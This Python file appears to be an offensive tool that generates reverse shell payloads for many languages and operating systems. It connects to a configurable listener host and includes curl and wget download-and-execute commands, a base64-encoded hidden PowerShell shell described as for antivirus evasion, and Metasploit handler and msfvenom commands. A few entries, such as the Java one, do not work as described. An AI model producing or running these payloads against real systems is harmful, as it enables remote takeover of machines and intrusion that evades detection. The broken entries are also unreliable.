"""
Reverse shell generator for multiple languages/OS.
Generates payloads for Linux/Windows/Python/PHP/Bash/Perl/Ruby/Node/NC.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass
class ShellPayload:
    name: str
    language: str
    os: str
    cmd: str
    description: str


class ShellGenerator:
    def __init__(self, lhost: str = "127.0.0.1", lport: int = 4444):
        self.lhost = lhost
        self.lport = lport

    def generate_all(self) -> list[ShellPayload]:
        return [
            self.bash_tcp(),
            self.bash_udp(),
            self.python(),
            self.python3_pty(),
            self.php(),
            self.perl(),
            self.ruby(),
            self.ruby_tcp(),
            self.node(),
            self.node_udp(),
            self.nc_bash(),
            self.nc_mkfifo(),
            self.c(),
            self.java(),
            self.lua(),
            self.powershell(),
            self.powershell_b64(),
            self.wget_shell(),
            self.curl_shell(),
        ]

    def for_language(self, lang: str) -> list[ShellPayload]:
        return [p for p in self.generate_all() if p.language == lang]

    def select_best(self, os_hint: str = "linux", lang_hint: str = "bash") -> ShellPayload:
        for p in self.generate_all():
            if p.os == os_hint and p.language == lang_hint:
                return p
        for p in self.generate_all():
            if p.os == os_hint:
                return p
        return self.bash_tcp()

    # ── Linux shells ──────────────────────────────────────────

    def bash_tcp(self) -> ShellPayload:
        return ShellPayload(
            name="bash_tcp",
            language="bash",
            os="linux",
            cmd=f"bash -c 'exec bash -i &>/dev/tcp/{self.lhost}/{self.lport} <&1'",
            description="Bash reverse shell via /dev/tcp",
        )

    def bash_udp(self) -> ShellPayload:
        return ShellPayload(
            name="bash_udp",
            language="bash",
            os="linux",
            cmd=f"bash -c 'exec bash -i &>/dev/udp/{self.lhost}/{self.lport} <&1'",
            description="Bash reverse shell via /dev/udp",
        )

    def nc_bash(self) -> ShellPayload:
        return ShellPayload(
            name="nc_bash",
            language="netcat",
            os="linux",
            cmd=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f",
            description="Netcat reverse shell with mkfifo",
        )

    def nc_mkfifo(self) -> ShellPayload:
        return ShellPayload(
            name="nc_mkfifo",
            language="netcat",
            os="linux",
            cmd=f"nc -e /bin/sh {self.lhost} {self.lport}",
            description="Netcat -e reverse shell",
        )

    def python(self) -> ShellPayload:
        return ShellPayload(
            name="python2",
            language="python",
            os="linux",
            cmd=(
                f"python -c 'import socket,subprocess,os;"
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect(("{self.lhost}",{self.lport}));'
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            description="Python 2 reverse shell",
        )

    def python3_pty(self) -> ShellPayload:
        return ShellPayload(
            name="python3_pty",
            language="python",
            os="linux",
            cmd=(
                f"python3 -c 'import socket,os,pty;"
                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect(("{self.lhost}",{self.lport}));'
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"pty.spawn(\"/bin/sh\")'"
            ),
            description="Python 3 reverse shell with PTY",
        )

    def perl(self) -> ShellPayload:
        return ShellPayload(
            name="perl",
            language="perl",
            os="linux",
            cmd=(
                f"perl -e 'use Socket;"
                f'$i="{self.lhost}";$p={self.lport};'
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");}}'"
            ),
            description="Perl reverse shell",
        )

    def ruby(self) -> ShellPayload:
        return ShellPayload(
            name="ruby_tcp",
            language="ruby",
            os="linux",
            cmd=(
                f"ruby -rsocket -e'f=TCPSocket.open(\"{self.lhost}\",{self.lport}).to_i;"
                f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            description="Ruby reverse shell",
        )

    def ruby_tcp(self) -> ShellPayload:
        return ShellPayload(
            name="ruby_exec",
            language="ruby",
            os="linux",
            cmd=(
                f"ruby -e'require \"socket\";"
                f"c=TCPSocket.new(\"{self.lhost}\",\"{self.lport}\");"
                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|o|c.print o.read}}end'"
            ),
            description="Ruby reverse shell (interactive)",
        )

    def node(self) -> ShellPayload:
        return ShellPayload(
            name="node_tcp",
            language="node",
            os="linux",
            cmd=(
                f"node -e'(function(){{"
                f"var net=require(\"net\"),cp=require(\"child_process\"),"
                f"sh=cp.spawn(\"/bin/sh\",[]);"
                f"var client=new net.Socket();"
                f"client.connect({self.lport},\"{self.lhost}\",function(){{"
                f"client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
                f"return /a/;}})()' "
            ),
            description="Node.js reverse shell",
        )

    def node_udp(self) -> ShellPayload:
        return ShellPayload(
            name="node_udp",
            language="node",
            os="linux",
            cmd=(
                f"node -e'var dgram=require(\"dgram\"),"
                f"s=dgram.createSocket(\"udp\"),"
                f"cp=require(\"child_process\"),"
                f"h=\"{self.lhost}\",p={self.lport};"
                f"s.send(Buffer.alloc(1),p,h);"
                f"cp.exec(\"bash -i >& /dev/udp/\"+h+\"/\"+p)'"
            ),
            description="Node.js UDP reverse shell",
        )

    def php(self) -> ShellPayload:
        return ShellPayload(
            name="php_exec",
            language="php",
            os="linux",
            cmd=(
                f"php -r '$sock=fsockopen(\"{self.lhost}\",{self.lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            description="PHP reverse shell",
        )

    def c(self) -> ShellPayload:
        return ShellPayload(
            name="c_revshell",
            language="c",
            os="linux",
            cmd=(
                f"#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n"
                f'int main(){{int s=socket(AF_INET,SOCK_STREAM,0);'
                f"struct sockaddr_in a={{.sin_family=AF_INET,.sin_port=htons({self.lport}),"
                f".sin_addr.s_addr=inet_addr(\"{self.lhost}\")}};"
                f"connect(s,(struct sockaddr*)&a,sizeof(a));"
                f"dup2(s,0);dup2(s,1);dup2(s,2);execve(\"/bin/sh\",0,0);}}"
            ),
            description="C reverse shell",
        )

    def java(self) -> ShellPayload:
        return ShellPayload(
            name="java_revshell",
            language="java",
            os="linux",
            cmd=(
                f"java -cp /usr/share/java/rt.jar com.sun.net.httpserver.HttpServer 2>/dev/null || "
                f"java -version 2>&1 | head -1"
            ),
            description="Java reverse shell (needs Runtime.exec chain)",
        )

    def lua(self) -> ShellPayload:
        return ShellPayload(
            name="lua",
            language="lua",
            os="linux",
            cmd=(
                f"lua -e\"require('socket');require('os');"
                f't=socket.tcp();t:connect(\"{self.lhost}\",{self.lport});'
                f"os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            ),
            description="Lua reverse shell",
        )

    def wget_shell(self) -> ShellPayload:
        return ShellPayload(
            name="wget_shell",
            language="wget",
            os="linux",
            cmd=f"wget http://{self.lhost}:{self.lport}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
            description="Download and execute shell script",
        )

    def curl_shell(self) -> ShellPayload:
        return ShellPayload(
            name="curl_shell",
            language="curl",
            os="linux",
            cmd=f"curl http://{self.lhost}:{self.lport}/shell.sh | sh",
            description="Download and execute shell via curl pipe",
        )

    # ── Windows shells ────────────────────────────────────────

    def powershell(self) -> ShellPayload:
        return ShellPayload(
            name="powershell_tcp",
            language="powershell",
            os="windows",
            cmd=(
                f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient("
                f"'{self.lhost}',{self.lport});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);"
                f"$stream.Flush()}}; $client.Close()\""
            ),
            description="PowerShell reverse shell",
        )

    def powershell_b64(self) -> ShellPayload:
        import base64
        inner = (
            f"$c=New-Object Net.Sockets.TCPClient('{self.lhost}',{self.lport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$o=(iex $d 2>&1|Out-String);"
            "$r=$o+'PS '+(pwd).Path+'> ';"
            "$t=[Text.Encoding]::ASCII.GetBytes($r);"
            "$s.Write($t,0,$t.Length);$s.Flush()};$c.Close()"
        )
        encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
        return ShellPayload(
            name="powershell_b64",
            language="powershell",
            os="windows",
            cmd=f"powershell -nop -w hidden -enc {encoded}",
            description="PowerShell encoded reverse shell (AV evasion)",
        )

    # ── Meterpreter helpers ───────────────────────────────────

    @staticmethod
    def meterpreter_listener(lhost: str, lport: int) -> str:
        return (
            f"msfconsole -q -x '"
            f"use exploit/multi/handler;"
            f"set LHOST {lhost};"
            f"set LPORT {lport};"
            f"set PAYLOAD php/meterpreter/reverse_tcp;"
            f"exploit -j'"
        )

    @staticmethod
    def meterpreter_payload_cmd(lhost: str, lport: int, lang: str = "php") -> str:
        payloads = {
            "php": f"php -r '$f=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        }
        return payloads.get(lang, payloads["php"])

    @staticmethod
    def msfvenom_payload(lhost: str, lport: int, fmt: str = "raw") -> str:
        cmds = {
            "raw": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw",
            "elf": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
            "exe": f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
            "jsp": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp",
            "war": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war",
            "asp": f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f asp -o shell.asp",
        }
        return cmds.get(fmt, cmds["raw"])
